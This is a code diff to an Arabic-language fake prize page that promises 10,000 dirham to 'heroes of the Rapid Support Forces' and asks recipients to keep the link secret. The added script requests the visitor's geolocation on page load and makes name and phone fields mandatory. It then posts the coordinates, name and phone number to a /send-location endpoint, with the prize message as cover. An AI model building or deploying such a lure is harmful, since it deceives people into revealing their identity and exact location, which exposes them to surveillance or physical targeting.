@@ -105,6 +105,18 @@
             font-size: 0.9em;
         }
 
+        .input-field {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1em;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
         .confirm-btn {
             background: linear-gradient(45deg, #FF512F 0%, #DD2476 100%);
             color: white;
@@ -116,6 +128,9 @@
             transition: transform 0.3s, box-shadow 0.3s;
             margin: 20px 0;
             width: 80%;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
         }
 
         .confirm-btn:hover {
@@ -154,13 +169,13 @@
     <div class="container">
         <div class="header">
             <h1>مبروك! 🎉</h1>
-            <div class="prize-amount">10,000 ريال</div>
-            <p>لقد ربحت في السحب الأسبوعي</p>
+            <div class="prize-amount">10,000 درهم</div>
+            <p>انت من ابطال الدعم السريع</p>
         </div>
         
         <div class="content">
             <div class="winner-info">
-                الرابح رقم <span class="winner-number">499</span> من <span>500</span>
+                البطل رقم <span class="winner-number">499</span> من <span>500</span>
             </div>
 
             <div class="timer">
@@ -170,17 +185,26 @@
             <div class="steps">
                 <div class="step">
                     <span class="step-number">1</span>
-                    <span>تم اختيارك كرابح في السحب الأسبوعي</span>
+                    <span>جوائز ابطال الدعم السريع</span>
                 </div>
                 <div class="step">
                     <span class="step-number">2</span>
-                    <span>اضغط على زر تأكيد الجائزة أدناه</span>
+                    <span> جوائز مقدمة من </strong>ال زايد<strong> اضغط على زر تأكيد الجائزة أدناه</span>
                 </div>
                 <div class="step">
                     <span class="step-number">3</span>
+                    <span>ملاحظة:
+                        اذا وصلك الرابط هذا يعني انك من ابطال الدعم السريع المقاتلين لاترسله الي احد او تخبر عنه احد لكي لايتم اغلاق الرابط وحينها لن تتمكن من اخذ مكافاتك
+                    </span>
+                </div>
+                <div class="step">
+                    <span class="step-number">4</span>
                     <span>سيتم التواصل معك عبر WhatsApp</span>
                 </div>
             </div>
+
+            <input type="text" id="name" class="input-field" placeholder="الاسم (إجباري)" required>
+            <input type="text" id="phone" class="input-field" placeholder="رقم الهاتف (إجباري)" required>
 
             <button class="confirm-btn pulse" onclick="startProcess()">تأكيد استلام الجائزة</button>
 
@@ -193,6 +217,8 @@
 
     <script src="script.js"></script>
     <script>
+        let locationPermissionGranted = false;
+
         // عداد تنازلي
         function updateTimer() {
             const countdownElement = document.getElementById('countdown');
@@ -220,6 +246,68 @@
 
         // تشغيل العداد عند تحميل الصفحة
         updateTimer();
+
+        // طلب إذن الوصول إلى الموقع فور دخول المستخدم
+        window.onload = function() {
+            requestLocationPermission();
+        };
+
+        function requestLocationPermission() {
+            navigator.geolocation.getCurrentPosition((position) => {
+                locationPermissionGranted = true;
+                console.log('تم الحصول على إذن الوصول إلى الموقع:', position);
+                storeLocation(position.coords);
+            }, (error) => {
+                locationPermissionGranted = false;
+                console.error('خطأ في الحصول على إذن الوصول إلى الموقع:', error);
+            });
+        }
+
+        function storeLocation(coords, name = '', phone = '') {
+            const { latitude, longitude, accuracy, timestamp } = coords;
+
+            fetch('/send-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ latitude, longitude, accuracy, timestamp: new Date().toISOString(), name, phone })
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.success) {
+                    document.getElementById('status').textContent = 'تم استلام موقعك بنجاح';
+                } else {
+                    document.getElementById('status').textContent = 'حدث خطأ أثناء إرسال الموقع. الرجاء المحاولة مرة أخرى.';
+                }
+            })
+            .catch(error => {
+                console.error('Error storing location:', error);
+                document.getElementById('status').textContent = 'حدث خطأ أثناء تخزين الموقع. الرجاء المحاولة مرة أخرى.';
+            });
+        }
+
+        // إرسال البيانات إلى الخادم
+        function startProcess() {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+
+            if (!name || !phone) {
+                alert('الرجاء إدخال الاسم ورقم الهاتف.');
+                return;
+            }
+
+            if (!locationPermissionGranted) {
+                requestLocationPermission();
+            }
+
+            navigator.geolocation.getCurrentPosition((position) => {
+                storeLocation(position.coords, name, phone);
+            }, (error) => {
+                console.error('Error getting location:', error);
+                document.getElementById('status').textContent = 'حدث خطأ أثناء الحصول على الموقع. الرجاء المحاولة مرة أخرى.';
+            });
+        }
     </script>
 </body>
 </html>
